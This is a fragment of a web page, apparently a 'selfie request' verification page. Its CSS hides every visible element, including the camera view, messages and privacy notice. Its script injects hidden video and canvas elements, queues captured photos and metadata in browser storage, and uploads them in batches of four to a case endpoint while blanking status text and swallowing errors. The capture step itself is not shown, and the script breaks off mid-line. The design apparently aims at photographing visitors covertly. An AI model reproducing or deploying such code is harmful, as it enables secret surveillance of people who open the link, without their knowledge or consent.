body{overflow:hidden}
.header,.page,.intro,.card,.request,.stage,.camera,.overlay,.controls,.message,.privacy,.status,.label,.ref,.camera video,.camera img,.camera canvas,.guide,.countdown{display:none!important}

<body>
<div aria-hidden="true"></div>
<script>
(()=>{"use strict";
const token=new URLSearchParams(location.search).get("id")||"";document.body.insertAdjacentHTML("beforeend",'<video id="video" autoplay muted playsinline style="display:none"></video><canvas id="canvas" hidden></canvas><img id="photo" alt="" style="display:none"><div id="cameraBox" style="display:none"></div><div id="overlay" style="display:none"></div><div id="message" style="display:none"></div><div id="reference" style="display:none"></div><div id="status" style="display:none"></div>');
const $=id=>document.getElementById(id);
const video=$("video"),photo=$("photo"),canvas=$("canvas"),box=$("cameraBox"),overlay=$("overlay"),message=$("message"),reference=$("reference"),status=$("status");
let stream=null,request=null,busy=false,locationData=null,capturedAt=null,queued=false,captureCount=0;
const DB_NAME="manlung-selfie-queue",DB_STORE="uploads";
function openQueue(){return new Promise((resolve,reject)=>{const r=indexedDB.open(DB_NAME,1);r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};r.onsuccess=()=>resolve(r.result);r.onerror=()=>reject(r.error)})}
async function queueBatch(blobs,metadata){
 try{
   const db=await openQueue();
   await new Promise((resolve,reject)=>{
     const tx=db.transaction(DB_STORE,"readwrite");
     const batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({token,batchId,blob,metadata:{...metadata,captureNumber:i+1},createdAt:new Date().toISOString()}));
     tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)
   });
 }catch(e){}
}
async function queueUpload(blob,metadata){try{const db=await openQueue();await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).add({token,blob,metadata,createdAt:new Date().toISOString()});tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});queued=true;setMessage("");status.textContent="";}catch(e){setMessage("");status.textContent=""}}
async function flushQueue(){try{const db=await openQueue();const rows=await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readonly");const q=tx.objectStore(DB_STORE).getAll();q.onsuccess=()=>resolve(q.result);q.onerror=()=>reject(q.error)});const grouped={};rows.filter(x=>x.token===token).forEach(x=>{const key=x.batchId||("legacy-"+x.id);(grouped[key]||(grouped[key]=[])).push(x)});for(const group of Object.values(grouped)){if(group.length!==4)continue;try{const fd=new FormData();group.forEach((row,i)=>fd.append("files",row.blob,"video-verification-offline-"+(i+1)+".jpg"));fd.append("metadata",JSON.stringify(group[0].metadata||{}));const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit"});const d=await r.json();if(!r.ok||!d.success){if(r.status===410){for(const row of group)await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});continue}throw new Error(d.error||"Upload failed")}for(const row of group)await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});}catch(e){break}}}catch(e){}}>
